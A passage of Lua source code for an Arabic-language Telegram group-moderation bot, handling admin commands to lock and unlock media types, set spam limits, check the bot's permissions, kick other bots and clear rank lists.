absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, Feras_dev, 14, string.len(msg.sender_user_id_))
DevFeras:del(DevFeras..'bot:gifs:mute'..msg.chat_id_)
else
Dev_Feras(msg.chat_id_, msg.id_, 1, '⌁︙المتحركه بالفعل مفتوحه في المجموعه', 1, 'md')
end
end
if unmutepts[2] == "الاغاني" then
if DevFeras:get(DevFeras..'bot:music:mute'..msg.chat_id_) then
local Feras_dev = '⌁︙اهلا عزيزي ↫ '..abs_rank(msg)..' \n⌁︙تم فتح الاغاني بنجاح \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, Feras_dev, 14, string.len(msg.sender_user_id_))
DevFeras:del(DevFeras..'bot:music:mute'..msg.chat_id_)
else
Dev_Feras(msg.chat_id_, msg.id_, 1, '⌁︙الاغاني بالفعل مفتوحه في المجموعه', 1, 'md')
end
end
if unmutepts[2] == "الصوت" then
if DevFeras:get(DevFeras..'bot:voice:mute'..msg.chat_id_) then
local Feras_dev = '⌁︙اهلا عزيزي ↫ '..abs_rank(msg)..' \n⌁︙تم فتح الصوت بنجاح \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, Feras_dev, 14, string.len(msg.sender_user_id_))
DevFeras:del(DevFeras..'bot:voice:mute'..msg.chat_id_)
else
Dev_Feras(msg.chat_id_, msg.id_, 1, '⌁︙الصوت بالفعل مفتوحه في المجموعه', 1, 'md')
end
end
if unmutepts[2] == "الروابط" then
if DevFeras:get(DevFeras..'bot:links:mute'..msg.chat_id_) then
local Feras_dev = '⌁︙اهلا عزيزي ↫ '..abs_rank(msg)..' \n⌁︙تم فتح الروابط بنجاح \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, Feras_dev, 14, string.len(msg.sender_user_id_))
DevFeras:del(DevFeras..'bot:links:mute'..msg.chat_id_)
else
Dev_Feras(msg.chat_id_, msg.id_, 1, '⌁︙الروابط بالفعل مفتوحه في المجموعه', 1, 'md')
end
end
if unmutepts[2] == "المواقع" then
if DevFeras:get(DevFeras..'bot:location:mute'..msg.chat_id_) then
local Feras_dev = '⌁︙اهلا عزيزي ↫ '..abs_rank(msg)..' \n⌁︙تم فتح المواقع بنجاح \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, Feras_dev, 14, string.len(msg.sender_user_id_))
DevFeras:del(DevFeras..'bot:location:mute'..msg.chat_id_)
else
Dev_Feras(msg.chat_id_, msg.id_, 1, '⌁︙المواقع بالفعل مفتوحه في المجموعه', 1, 'md')
end
end
if unmutepts[2] == "المعرف" then
if DevFeras:get(DevFeras..'tags:lock'..msg.chat_id_) then
local Feras_dev = '⌁︙اهلا عزيزي ↫ '..abs_rank(msg)..' \n⌁︙تم فتح المعرف بنجاح \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, Feras_dev, 14, string.len(msg.sender_user_id_))
DevFeras:del(DevFeras..'tags:lock'..msg.chat_id_)
else
Dev_Feras(msg.chat_id_, msg.id_, 1, '⌁︙المعرف بالفعل مفتوحه في المجموعه', 1, 'md')
end
end
if unmutepts[2] == "الهاشتاك" then
if DevFeras:get(DevFeras..'bot:abstag:mute'..msg.chat_id_) then
local Feras_dev = '⌁︙اهلا عزيزي ↫ '..abs_rank(msg)..' \n⌁︙تم فتح الهاشتاك بنجاح \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, Feras_dev, 14, string.len(msg.sender_user_id_))
DevFeras:del(DevFeras..'bot:abstag:mute'..msg.chat_id_)
else
Dev_Feras(msg.chat_id_, msg.id_, 1, '⌁︙الهاشتاك بالفعل مفتوحه في المجموعه', 1, 'md')
end
end
if unmutepts[2] == "الجهات" then
if DevFeras:get(DevFeras..'bot:contact:mute'..msg.chat_id_) then
local Feras_dev = '⌁︙اهلا عزيزي ↫ '..abs_rank(msg)..' \n⌁︙تم فتح الجهات بنجاح \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, Feras_dev, 14, string.len(msg.sender_user_id_))
DevFeras:del(DevFeras..'bot:contact:mute'..msg.chat_id_)
else
Dev_Feras(msg.chat_id_, msg.id_, 1, '⌁︙الجهات بالفعل مفتوحه في المجموعه', 1, 'md')
end
end
if unmutepts[2] == "الشبكات" then
if DevFeras:get(DevFeras..'bot:webpage:mute'..msg.chat_id_) then
local Feras_dev = '⌁︙اهلا عزيزي ↫ '..abs_rank(msg)..' \n⌁︙تم فتح الشبكات بنجاح \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, Feras_dev, 14, string.len(msg.sender_user_id_))
DevFeras:del(DevFeras..'bot:webpage:mute'..msg.chat_id_)
else
Dev_Feras(msg.chat_id_, msg.id_, 1, '⌁︙الشبكات بالفعل مفتوحه في المجموعه', 1, 'md')
end
end
if unmutepts[2] == "العربيه" then
if DevFeras:get(DevFeras..'bot:arabic:mute'..msg.chat_id_) then
local Feras_dev = '⌁︙اهلا عزيزي ↫ '..abs_rank(msg)..' \n⌁︙تم فتح العربيه بنجاح \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, Feras_dev, 14, string.len(msg.sender_user_id_))
DevFeras:del(DevFeras..'bot:arabic:mute'..msg.chat_id_)
else
Dev_Feras(msg.chat_id_, msg.id_, 1, '⌁︙العربيه بالفعل مفتوحه في المجموعه', 1, 'md')
end
end
if unmutepts[2] == "الانجليزيه" then
if DevFeras:get(DevFeras..'bot:english:mute'..msg.chat_id_) then
local Feras_dev = '⌁︙اهلا عزيزي ↫ '..abs_rank(msg)..' \n⌁︙تم فتح الانجليزيه بنجاح \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, Feras_dev, 14, string.len(msg.sender_user_id_))
DevFeras:del(DevFeras..'bot:english:mute'..msg.chat_id_)
else
Dev_Feras(msg.chat_id_, msg.id_, 1, '⌁︙الانجليزيه بالفعل مفتوحه في المجموعه', 1, 'md')
end
end
if unmutepts[2] == "الاشعارات" then
if DevFeras:get(DevFeras..'bot:tgservice:jk'..msg.chat_id_) then
local Feras_dev = '⌁︙اهلا عزيزي ↫ '..abs_rank(msg)..' \n⌁︙تم فتح الاشعارات بنجاح \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, Feras_dev, 14, string.len(msg.sender_user_id_))
DevFeras:del(DevFeras..'bot:tgservice:jk'..msg.chat_id_)
else
Dev_Feras(msg.chat_id_, msg.id_, 1, '⌁︙الاشعارات بالفعل مفتوحه في المجموعه', 1, 'md')
end
end
if unmutepts[2] == "الملصقات" then
if DevFeras:get(DevFeras..'bot:sticker:mute'..msg.chat_id_) then
local Feras_dev = '⌁︙اهلا عزيزي ↫ '..abs_rank(msg)..' \n⌁︙تم فتح الملصقات بنجاح \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, Feras_dev, 14, string.len(msg.sender_user_id_))
DevFeras:del(DevFeras..'bot:sticker:mute'..msg.chat_id_)
else
Dev_Feras(msg.chat_id_, msg.id_, 1, '⌁︙الملصقات بالفعل مفتوحه في المجموعه', 1, 'md')
end
end
if unmutepts[2] == "التوجيه" then
if DevFeras:get(DevFeras..'bot:forward:mute'..msg.chat_id_) then
local Feras_dev = '⌁︙اهلا عزيزي ↫ '..abs_rank(msg)..' \n⌁︙تم فتح التوجيه بنجاح \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, Feras_dev, 14, string.len(msg.sender_user_id_))
DevFeras:del(DevFeras..'bot:forward:mute'..msg.chat_id_)
else
Dev_Feras(msg.chat_id_, msg.id_, 1, '⌁︙التوجيه بالفعل مفتوح في المجموعه', 1, 'md')
end
end
end
end
--     Source DevFeras     --
if text and text:match("^قفل التفليش$") then
if not MonshId(msg.sender_user_id_, msg.chat_id_) then
Dev_Feras(msg.chat_id_, msg.id_, 1, '⌁︙للمنشئ الاساسي فقط ', 1, 'md')
else
DevFeras:set(DevFeras..'bot:links:mute'..msg.chat_id_,true) DevFeras:set(DevFeras..'bot:forward:mute'..msg.chat_id_,true) DevFeras:set(DevFeras.."abs:Lock:Bots"..msg.chat_id_,"del") DevFeras:hset(DevFeras.."abs:Spam:Group:User"..msg.chat_id_ ,"Spam:User","del") DevFeras:set(DevFeras..'bot:video:mute'..msg.chat_id_,true) DevFeras:set(DevFeras..'bot:gifs:mute'..msg.chat_id_,true) DevFeras:set(DevFeras..'editmsg'..msg.chat_id_,true)
DevFeras:set(DevFeras..'bot:sticker:mute'..msg.chat_id_,true) DevFeras:set(DevFeras..'farsi'..msg.chat_id_,true) DevFeras:del(DevFeras.."fshar"..msg.chat_id_) DevFeras:del(DevFeras.."taf"..msg.chat_id_) DevFeras:del(DevFeras.."kaf"..msg.chat_id_) DevFeras:set('DevFeras:id:photo'..msg.chat_id_,true) DevFeras:set(DevFeras..'bot:spam:mute'..msg.chat_id_,true) DevFeras:set(DevFeras..'bot:webpage:mute'..msg.chat_id_,true)
local Feras_dev = '⌁︙اهلا عزيزي ↫ '..abs_rank(msg)..' \n⌁︙تم قفل التفليش بنجاح \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, Feras_dev, 14, string.len(msg.sender_user_id_))
end
end
if text and text:match("^فتح التفليش$") then
if not MonshId(msg.sender_user_id_, msg.chat_id_) then
Dev_Feras(msg.chat_id_, msg.id_, 1, '⌁︙للمنشئ الاساسي فقط ', 1, 'md')
else
DevFeras:del(DevFeras..'bot:links:mute'..msg.chat_id_) DevFeras:del(DevFeras..'bot:forward:mute'..msg.chat_id_) DevFeras:hdel(DevFeras.."abs:Spam:Group:User"..msg.chat_id_ ,"Spam:User") DevFeras:del(DevFeras..'bot:video:mute'..msg.chat_id_)
DevFeras:del(DevFeras..'bot:gifs:mute'..msg.chat_id_) DevFeras:del(DevFeras..'bot:sticker:mute'..msg.chat_id_) DevFeras:del(DevFeras..'farsi'..msg.chat_id_) DevFeras:set(DevFeras..'fshar'..msg.chat_id_,true) DevFeras:set(DevFeras..'taf'..msg.chat_id_,true) DevFeras:set(DevFeras..'kaf'..msg.chat_id_,true)
DevFeras:del('DevFeras:id:photo'..msg.chat_id_)
local Feras_dev = '⌁︙اهلا عزيزي ↫ '..abs_rank(msg)..' \n⌁︙تم فتح التفليش بنجاح \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, Feras_dev, 14, string.len(msg.sender_user_id_))
end
end
--     Source DevFeras     --
if text and text:match("^قفل الكل$") then
if not Admin(msg.sender_user_id_, msg.chat_id_) then
Dev_Feras(msg.chat_id_, msg.id_, 1, '⌁︙للمشرفين فقط ', 1, 'md')
else
DevFeras:set(DevFeras..'editmsg'..msg.chat_id_,true) DevFeras:set(DevFeras..'farsi'..msg.chat_id_,true) DevFeras:del(DevFeras..'fshar'..msg.chat_id_) DevFeras:del(DevFeras..'taf'..msg.chat_id_) DevFeras:del(DevFeras..'kaf'..msg.chat_id_) DevFeras:set(DevFeras..'farsiban'..msg.chat_id_,true)
DevFeras:set(DevFeras.."abs:Lock:Bots"..msg.chat_id_,"del") DevFeras:hset(DevFeras.."abs:Spam:Group:User"..msg.chat_id_ ,"Spam:User","del") DevFeras:set(DevFeras..'bot:text:mute'..msg.chat_id_,true) DevFeras:set(DevFeras..'bot:tgservice:jk'..msg.chat_id_,true)
DevFeras:set(DevFeras..'bot:inline:mute'..msg.chat_id_,true) DevFeras:set(DevFeras..'bot:photo:mute'..msg.chat_id_,true) DevFeras:set(DevFeras..'bot:spam:mute'..msg.chat_id_,true) DevFeras:set(DevFeras..'bot:video:mute'..msg.chat_id_,true) DevFeras:set(DevFeras..'bot:gifs:mute'..msg.chat_id_,true)
DevFeras:set(DevFeras..'bot:music:mute'..msg.chat_id_,true) DevFeras:set(DevFeras..'bot:voice:mute'..msg.chat_id_,true) DevFeras:set(DevFeras..'bot:links:mute'..msg.chat_id_,true) DevFeras:set(DevFeras..'bot:location:mute'..msg.chat_id_,true) DevFeras:set(DevFeras..'tags:lock'..msg.chat_id_,true)
DevFeras:set(DevFeras..'bot:sticker:mute'..msg.chat_id_,true) DevFeras:set(DevFeras..'markdown:lock'..msg.chat_id_,true) DevFeras:set(DevFeras..'bot:forward:mute'..msg.chat_id_,true) DevFeras:set(DevFeras..'bot:Join:mute'..msg.chat_id_,true) 
DevFeras:set(DevFeras..'bot:document:mute'..msg.chat_id_,true) DevFeras:set(DevFeras..'bot:contact:mute'..msg.chat_id_,true) DevFeras:set(DevFeras..'bot:abstag:mute'..msg.chat_id_,true) DevFeras:set(DevFeras..'bot:webpage:mute'..msg.chat_id_,true) 
local Feras_dev = '⌁︙اهلا عزيزي ↫ '..abs_rank(msg)..' \n⌁︙تم قفل جميع الاوامر \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, Feras_dev, 14, string.len(msg.sender_user_id_))
end
end
if text and text:match("^فتح الكل$") then
if not Admin(msg.sender_user_id_, msg.chat_id_) then
Dev_Feras(msg.chat_id_, msg.id_, 1, '⌁︙للمشرفين فقط ', 1, 'md')
else
DevFeras:del(DevFeras..'editmsg'..msg.chat_id_) DevFeras:del(DevFeras..'farsi'..msg.chat_id_) DevFeras:set(DevFeras..'fshar'..msg.chat_id_,true) DevFeras:set(DevFeras..'taf'..msg.chat_id_,true) DevFeras:set(DevFeras..'kaf'..msg.chat_id_,true) DevFeras:del(DevFeras..'farsiban'..msg.chat_id_)
DevFeras:del(DevFeras.."abs:Lock:Bots"..msg.chat_id_) DevFeras:hdel(DevFeras.."abs:Spam:Group:User"..msg.chat_id_ ,"Spam:User") DevFeras:del(DevFeras..'bot:tgservice:jk'..msg.chat_id_) DevFeras:del(DevFeras..'bot:Join:mute'..msg.chat_id_) 
DevFeras:del(DevFeras..'bot:text:mute'..msg.chat_id_) DevFeras:del(DevFeras..'bot:photo:mute'..msg.chat_id_) DevFeras:del(DevFeras..'bot:spam:mute'..msg.chat_id_) DevFeras:del(DevFeras..'bot:video:mute'..msg.chat_id_) DevFeras:del(DevFeras..'bot:sticker:mute'..msg.chat_id_)
DevFeras:del(DevFeras..'bot:document:mute'..msg.chat_id_) DevFeras:del(DevFeras..'bot:inline:mute'..msg.chat_id_) DevFeras:del(DevFeras..'markdown:lock'..msg.chat_id_) DevFeras:del(DevFeras..'bot:gifs:mute'..msg.chat_id_) DevFeras:del(DevFeras..'bot:music:mute'..msg.chat_id_)
DevFeras:del(DevFeras..'bot:voice:mute'..msg.chat_id_) DevFeras:del(DevFeras..'bot:links:mute'..msg.chat_id_) DevFeras:del(DevFeras..'bot:location:mute'..msg.chat_id_) DevFeras:del(DevFeras..'tags:lock'..msg.chat_id_) DevFeras:del(DevFeras..'bot:forward:mute'..msg.chat_id_)
DevFeras:del(DevFeras..'bot:abstag:mute'..msg.chat_id_) DevFeras:del(DevFeras..'bot:contact:mute'..msg.chat_id_) DevFeras:del(DevFeras..'bot:webpage:mute'..msg.chat_id_) DevFeras:del(DevFeras..'bot:arabic:mute'..msg.chat_id_) DevFeras:del(DevFeras..'bot:english:mute'..msg.chat_id_)
local Feras_dev = '⌁︙اهلا عزيزي ↫ '..abs_rank(msg)..' \n⌁︙تم فتح جميع الاوامر \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, Feras_dev, 14, string.len(msg.sender_user_id_))
end
end
--     Source DevFeras     --
end
--     Source DevFeras     --
if Admin(msg.sender_user_id_, msg.chat_id_) then
if text and text:match("^ضع سبام (%d+)$") and ChCheck(msg) then
local sensspam = {string.match(text, "^(ضع سبام) (%d+)$")}
if tonumber(sensspam[2]) < 40 then
Dev_Feras(msg.chat_id_, msg.id_, 1, '⌁︙اختر عدد اكبر من 40 حرف ', 1, 'md')
else
DevFeras:set(DevFeras..'bot:sens:spam'..msg.chat_id_,sensspam[2])
Dev_Feras(msg.chat_id_, msg.id_, 1, '⌁︙تم وضع عدد السبام ↫'..sensspam[2], 1, 'md')
end
end
end
--     Source DevFeras     --
if Owner(msg.sender_user_id_, msg.chat_id_) then
if text == "فحص" or text == "فحص البوت" then
local check = https.request('https://api.telegram.org/bot'..TokenBot..'/getChatMember?chat_id='..msg.chat_id_..'&user_id='..DevFeras)
local GetInfo = JSON.decode(check)
if GetInfo.ok == true then
if GetInfo.result.can_change_info == true then EDT = '✔️' else EDT = '✖️' end
if GetInfo.result.can_delete_messages == true then DEL = '✔️' else DEL = '✖️' end
if GetInfo.result.can_invite_users == true then INV = '✔️' else INV = '✖️' end
if GetInfo.result.can_pin_messages == true then PIN = '✔️' else PIN = '✖️' end
if GetInfo.result.can_restrict_members == true then BAN = '✔️' else BAN = '✖️' end
if GetInfo.result.can_promote_members == true then VIP = '✔️' else VIP = '✖️' end 
Dev_Feras(msg.chat_id_, msg.id_, 1, '⌁︙صلاحيات البوت هي ↫ ⤈\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n⌁︙حذف الرسائل ↫ '..DEL..'\n⌁︙دعوة المستخدمين ↫ '..INV..'\n⌁︙حظر المستخدمين ↫ '..BAN..'\n⌁︙تثبيت الرسائل ↫ '..PIN..'\n⌁︙تغيير المعلومات ↫ '..EDT..'\n⌁︙اضافة مشرفين ↫ '..VIP..'\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉', 1, 'md')
end end
if text and text:match("^تغير رد المطور (.*)$") then
local Text = text:match("^تغير رد المطور (.*)$") 
DevFeras:set(DevFeras.."abs:SudoBot:Rd"..msg.chat_id_,Text)
Dev_Feras(msg.chat_id_, msg.id_, 1, "⌁︙تم تغير رد المطور الى ↫ "..Text, 1, 'md')
end
if text and text:match("^تغير رد منشئ الاساسي (.*)$") then
local Text = text:match("^تغير رد منشئ الاساسي (.*)$") 
DevFeras:set(DevFeras.."abs:monsh:Rd"..msg.chat_id_,Text)
Dev_Feras(msg.chat_id_, msg.id_, 1, "⌁︙تم تغير رد المنشئ الاساسي الى ↫ "..Text, 1, 'md')
end
if text and text:match("^تغير رد المنشئ (.*)$") then
local Text = text:match("^تغير رد المنشئ (.*)$") 
DevFeras:set(DevFeras.."abs:monshid:Rd"..msg.chat_id_,Text)
Dev_Feras(msg.chat_id_, msg.id_, 1, "⌁︙تم تغير رد المنشئ الى ↫ "..Text, 1, 'md')
end
if text and text:match("^تغير رد المدير (.*)$") then
local Text = text:match("^تغير رد المدير (.*)$") 
DevFeras:set(DevFeras.."abs:owners:Rd"..msg.chat_id_,Text) 
Dev_Feras(msg.chat_id_, msg.id_, 1, "⌁︙تم تغير رد المدير الى ↫ "..Text, 1, 'md')
end
if text and text:match("^تغير رد الادمن (.*)$") then
local Text = text:match("^تغير رد الادمن (.*)$") 
DevFeras:set(DevFeras.."abs:admins:Rd"..msg.chat_id_,Text)
Dev_Feras(msg.chat_id_, msg.id_, 1, "⌁︙تم تغير رد الادمن الى ↫ "..Text, 1, 'md')
end
if text and text:match("^تغير رد المميز (.*)$") then
local Text = text:match("^تغير رد المميز (.*)$") 
DevFeras:set(DevFeras.."abs:vipmem:Rd"..msg.chat_id_,Text)
Dev_Feras(msg.chat_id_, msg.id_, 1, "⌁︙تم تغير رد المميز الى ↫ "..Text, 1, 'md')
end
if text and text:match("^تغير رد المنظف (.*)$") then
local Text = text:match("^تغير رد المنظف (.*)$") 
DevFeras:set(DevFeras.."abs:Cleaner:Rd"..msg.chat_id_,Text)
Dev_Feras(msg.chat_id_, msg.id_, 1, "⌁︙تم تغير رد المنظف الى ↫ "..Text, 1, 'md')
end
if text and text:match("^تغير رد العضو (.*)$") then
local Text = text:match("^تغير رد العضو (.*)$") 
DevFeras:set(DevFeras.."abs:mem:Rd"..msg.chat_id_,Text)
Dev_Feras(msg.chat_id_, msg.id_, 1, "⌁︙تم تغير رد العضو الى ↫ "..Text, 1, 'md')
end
if text == "حذف ردود الرتب" or text == "مسح ردود الرتب" then
Dev_Feras(msg.chat_id_, msg.id_, 1, "⌁︙تم حذف جميع ردود الرتب", 1, 'md')
DevFeras:del(DevFeras.."abs:mem:Rd"..msg.chat_id_)
DevFeras:del(DevFeras.."abs:Cleaner:Rd"..msg.chat_id_)
DevFeras:del(DevFeras.."abs:vipmem:Rd"..msg.chat_id_)
DevFeras:del(DevFeras.."abs:admins:Rd"..msg.chat_id_)
DevFeras:del(DevFeras.."abs:owners:Rd"..msg.chat_id_)
DevFeras:del(DevFeras.."abs:monshid:Rd"..msg.chat_id_)
DevFeras:del(DevFeras.."abs:monsh:Rd"..msg.chat_id_)
DevFeras:del(DevFeras.."abs:SudoBot:Rd"..msg.chat_id_)
end
end
--     Source DevFeras     --
if text == "كشف البوتات" and ChCheck(msg) then 
local function cb(extra,result,success)
local admins = result.members_  
text = '⌁︙*قائمة البوتات* ↫ ⤈ \n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n'
local n = 0
local t = 0
for i=0 , #admins do 
n = (n + 1)
tdcli_function ({ID = "GetUser",user_id_ = admins[i].user_id_
},function(arg,data) 
if result.members_[i].status_.ID == "ChatMemberStatusMember" then  
ab = ''
elseif result.members_[i].status_.ID == "ChatMemberStatusEditor" then  
t = t + 1
ab = ' ✯'
end
text = text.."~ [@"..data.username_..']'..ab.."\n"
if #admins == 0 then
Dev_Feras(msg.chat_id_, msg.id_, 1, "⌁︙*لاتوجد بوتات هنا*", 1, 'md')
return false end
if #admins == i then 
local a = '┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n⌁︙*عدد البوتات هنا* ↫ '..n..'\n'
local f = '⌁︙*عدد البوتات المرفوعه* ↫ '..t..'\n⌁︙*ملاحضه علامة الـ*✯ *تعني ان البوت ادمن في هذه المجموعه*'
Dev_Feras(msg.chat_id_, msg.id_, 1, text..a..f, 1, 'md')
end
end,nil)
end
end
getChannelMembers(msg.chat_id_, 0, 'Bots', 200,cb)
end
if text == 'حذف البوتات' and ChCheck(msg) or text == 'طرد البوتات' and ChCheck(msg) or text == 'مسح البوتات' and ChCheck(msg) then
tdcli_function ({ ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),filter_ = {ID = "ChannelMembersBots"},offset_ = 0,limit_ = 100 },function(arg,dp)  
local admins = dp.members_  
local x = 0
local c = 0
for i=0 , #admins do 
if dp.members_[i].status_.ID == "ChatMemberStatusEditor" then  
x = x + 1 
end
if tonumber(admins[i].user_id_) ~= tonumber(bot_id) then
ChatKick(msg.chat_id_,admins[i].user_id_)
end
c = c + 1
end     
if (c - x) == 0 then
Dev_Feras(msg.chat_id_, msg.id_, 1, "⌁︙*لاتوجد بوتات هنا*", 1, 'md')
else
Dev_Feras(msg.chat_id_, msg.id_, 1, "⌁︙*عدد البوتات هنا* ↫ "..c.."\n⌁︙*عدد البوتات المرفوعه* ↫ "..x.."\n⌁︙*تم طرد* ↫ "..(c - x).." *من البوتات*", 1, 'md')
end 
end,nil)  
end 
--     Source DevFeras     --
if Admin(msg.sender_user_id_, msg.chat_id_) then
if text and text:match("^حذف (.*)$") and ChCheck(msg) or text and text:match("^مسح (.*)$") and ChCheck(msg) then
local txts = {string.match(text, "^(حذف) (.*)$")}
local txtss = {string.match(text, "^(مسح) (.*)$")}
if Sudo(msg) then 
if txts[2] == 'المطورين' or txtss[2] == 'المطورين' then
DevFeras:del(DevFeras..'abs:SudoBot:')
local Feras_dev = '⌁︙اهلا عزيزي ↫ '..abs_rank(msg)..' \n⌁︙تم حذف المطورين \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, Feras_dev, 14, string.len(msg.sender_user_id_))
end
if txts[2] == 'قائمه العام' or txtss[2] == 'قائمه العام' then
DevFeras:del(DevFeras..'abs:BanAll:')
DevFeras:del(DevFeras..'abs:MuteAll:')
local Feras_dev = '⌁︙اهلا عزيزي ↫ '..abs_rank(msg)..' \n⌁︙تم حذف قائمة العام \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, Feras_dev, 14, string.len(msg.sender_user_id_))
end
end
if SudoBot(msg.sender_user_id_, msg.chat_id_) then
if txts[2] == 'الادمنيه العامين' or txts[2] == 'الادمنيه العام' or txtss[2] == 'الادمنيه العامين' or txtss[2] == 'الادمنيه العام' then
local Feras_dev = '⌁︙اهلا عزيزي ↫ '..abs_rank(msg)..' \n⌁︙تم حذف الادمنيه العامين \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, Feras_dev, 14, string.len(msg.sender_user_id_))
DevFeras:del(DevFeras..'abs:adminall:')
end
if txts[2] == 'المميزين عام' or txts[2] == 'المميزين العامين' or txtss[2] == 'المميزين عام' or txtss[2] == 'المميزين العامين' then
local Feras_dev = '⌁︙اهلا عزيزي ↫ '..abs_rank(msg)..' \n⌁︙تم حذف المميزين عام \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, Feras_dev, 14, string.len(msg.sender_user_id_))
DevFeras:del(DevFeras..'abs:vipall:')
end
if txts[2] == 'المدراء العامين' or txts[2] == 'المدراء العام' or txtss[2] == 'المدراء العامين' or txtss[2] == 'المدراء العام' then
local Feras_dev = '⌁︙اهلا عزيزي ↫ '..abs_rank(msg)..' \n⌁︙تم حذف المدراء العامين \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, Feras_dev, 14, string.len(msg.sender_user_id_))
DevFeras:del(DevFeras..'abs:ownerall:')
end
end
if AbsMonsh(msg.sender_user_id_, msg.chat_id_) then
if txts[2] == 'المنشئين الاساسيين' or txtss[2] == 'المنشئين الاساسيين' then
local Feras_dev = '⌁︙اهلا عزيزي ↫ '..abs_rank(msg)..' \n⌁︙تم حذف المنشئين الاساسيين \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, Feras_dev, 14, string.len(msg.sender_user_id_))
DevFeras:del(DevFeras..'abs:monsh:'..msg.chat_id_)
end
end
if Monsh(msg.sender_user_id_, msg.chat_id_) then
if txts[2] == 'المنشئين' or txtss[2] == 'المنشئين' then
local Feras_dev = '⌁︙اهلا عزيزي ↫ '..abs_rank(msg)..' \n⌁︙تم حذف المنشئين \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, Feras_dev, 14, string.len(msg.sender_user_id_))
DevFeras:del(DevFeras..'abs:monshid:'..msg.chat_id_)
end end
if MonshId(msg.sender_user_id_, msg.chat_id_) then
if txts[2] == 'المدراء' or txtss[2] == 'المدراء' then
local Feras_dev = '⌁︙اهلا عزيزي ↫ '..abs_rank(msg)..' \n⌁︙تم حذف المدراء \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, Feras_dev, 14, string.len(msg.sender_user_id_))
DevFeras:del(DevFeras..'abs:owners:'..msg.chat_id_)
end 
if txts[2] == 'المنظفين' or txtss[2] == 'المنظفين' then
local Feras_dev = '⌁︙اهلا عزيزي ↫ '..abs_rank(msg)..' \n⌁︙تم حذف المنظفين \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, Feras_dev, 14, string.len(msg.sender_user_id_))
DevFeras:del(DevFeras..'abs:Cleaner:'..msg.chat_id_)
end end
if Owner(msg.sender_user_id_, msg.chat_id_) then
if txts[2] == 'الادمنيه' or txtss[2] == 'الادمنيه' then
local Feras_dev = '⌁︙اهلا عزيزي ↫ '..abs_rank(msg)..' \n⌁︙تم حذف الادمنيه \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, Feras_dev, 14, string.len(msg.sender_user_id_))
DevFeras:del(DevFeras..'abs:admins:'..msg.chat_id_)
end
end
if txts[2] == 'المطايه' or txtss[2] == 'المطايه' then
local Feras_dev = '⌁︙اهلا عزيزي ↫ '..abs_rank(msg)..' \n⌁︙تم حذف المطايه \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, Feras_dev, 14, string.len(msg.sender_user_id_))
DevFeras:del(DevFeras..'bot:donky:'..msg.chat_id_)
end
if txts[2] == 'الرابط' or txtss[2] == 'الرابط' then
local Feras_dev = '⌁︙اهلا عزيزي ↫ '..abs_rank(msg)..' \n⌁︙تم حذف رابط المجموعه \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, Feras_dev, 14, string.len(msg.sender_user_id_))
DevFeras:del(DevFeras.."bot:group:link"..msg.chat_id_)
end
if txts[2] == 'المميزين' or txtss[2] == 'المميزين' then
local Feras_dev = '⌁︙اهلا عزيزي ↫ '..abs_rank(msg)..' \n⌁︙تم حذف المميزين \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, Feras_dev, 14, string.len(msg.sender_user_id_))
DevFeras:del(DevFeras..'abs:vipmem:'..msg.chat_id_)
end
if txts[2] == 'المكتومين' or txtss[2] == 'المكتومين' then
DevFeras:del(DevFeras..'abs:Muted:'..msg.chat_id_)
local Feras_dev = '⌁︙اهلا عزيزي ↫ '..abs_rank(msg)..' \n⌁︙تم حذف المكتومين \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, Feras_dev, 14, string.len(msg.sender_user_id_))
end
if txts[2] == 'المقيدين' or txtss[2] == 'المقيدين' then     
local list = DevFeras:smembers(DevFeras..'abs:Tkeed:'..msg.chat_id_)
for k,v in pairs(list) do   
HTTPS.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id="..v.."&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True") 
DevFeras:srem(DevFeras..'abs:Tkeed:'..msg.chat_id_, v)
end 
local Feras_dev = '⌁︙اهلا عزيزي ↫ '..abs_rank(msg)..' \n⌁︙تم حذف المقيدين \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, Feras_dev, 14, string.len(msg.sender_user_id_))
end
